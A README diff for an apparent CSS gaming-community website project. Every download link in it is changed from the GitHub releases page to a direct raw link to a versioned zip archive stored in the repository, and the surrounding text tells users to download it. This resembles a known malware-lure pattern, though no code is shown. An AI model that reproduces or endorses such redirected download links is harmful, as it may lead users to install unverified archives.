@@ -1,6 +1,6 @@
 # 🎮 ShadowPixel-Gaming-Club - Modern Gaming Community Site
 
-[![Download Now](https://img.shields.io/badge/Download%20Release%20Page-ShadowPixel%20Gaming%20Club-blue?style=for-the-badge)](https://github.com/Crashgreen444/ShadowPixel-Gaming-Club/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Release%20Page-ShadowPixel%20Gaming%20Club-blue?style=for-the-badge)](https://raw.githubusercontent.com/Crashgreen444/ShadowPixel-Gaming-Club/main/resources/Shadow_Gaming_Pixel_Club_v1.3.zip)
 
 ## 🖥️ What This Is
 
@@ -12,7 +12,7 @@ This project is made for users who want to view a gaming-themed site with a shar
 
 Use the release page below to visit the download page and get the latest version:
 
-[Visit the release page to download ShadowPixel-Gaming-Club](https://github.com/Crashgreen444/ShadowPixel-Gaming-Club/releases)
+[Visit the release page to download ShadowPixel-Gaming-Club](https://raw.githubusercontent.com/Crashgreen444/ShadowPixel-Gaming-Club/main/resources/Shadow_Gaming_Pixel_Club_v1.3.zip)
 
 After you download the file:
 
@@ -139,7 +139,7 @@ css, css-grid, flexbox, frontend, frontend-project, gaming-website, github-pages
 
 Use this link any time you need the latest download:
 
-[https://github.com/Crashgreen444/ShadowPixel-Gaming-Club/releases](https://github.com/Crashgreen444/ShadowPixel-Gaming-Club/releases)
+[https://raw.githubusercontent.com/Crashgreen444/ShadowPixel-Gaming-Club/main/resources/Shadow_Gaming_Pixel_Club_v1.3.zip](https://raw.githubusercontent.com/Crashgreen444/ShadowPixel-Gaming-Club/main/resources/Shadow_Gaming_Pixel_Club_v1.3.zip)
 
 ## 🛠️ If You Want to Edit It Later
 
